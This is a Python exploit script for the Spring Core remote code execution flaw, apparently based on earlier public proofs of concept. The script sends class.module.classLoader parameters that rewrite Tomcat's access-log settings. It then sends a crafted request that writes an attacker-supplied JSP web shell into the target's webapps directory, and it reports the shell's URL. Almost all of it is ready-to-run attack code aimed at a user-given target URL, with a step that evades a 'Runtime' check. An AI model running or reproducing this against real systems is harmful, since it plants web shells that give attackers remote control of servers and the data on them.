# Author: @RogerSu
# Based off the work of Rezn0k,p1n93r

import requests
import argparse
from urllib.parse import urlparse
import time
from urllib import parse

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}

def run_exploit(url, directory, webshell, filename):
    ws = ''
    with open(webshell,'r',encoding='utf-8') as f:
        for line in f.readlines():
            #line = line.strip()
            ws += line
    
    ws = ws.replace('<%','%{prefix}i')
    ws = ws.replace('%>','%{suffix}i')
    ws = ws.replace('Runtime','&{c}i')

    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=" + parse.quote(ws)

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])


    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Changes take some time to populate on tomcat
    time.sleep(3)

    # Send the packet that writes the web shell
    ret = requests.get(url, headers=get_headers, verify=False)
    print("[*] Response Code: %d" % ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)


def main():
    print('''
# Author: @RogerSu
# Based off the work of Rezn0k,p1n93r
    ''')
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url',help='target url', required=True)
    parser.add_argument('--ws',help='WebShell File [example.jsp]', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
                        required=False, default="webapps/ROOT")

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url
    ws_arg = parser.parse_args().ws

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return
    if ws_arg is None:
        print("Must pass an option for --ws")
        return

    try:
        run_exploit(url_arg, dir_arg, ws_arg, filename)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp"
        print(f"[+] WebShell should be at: {location}")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
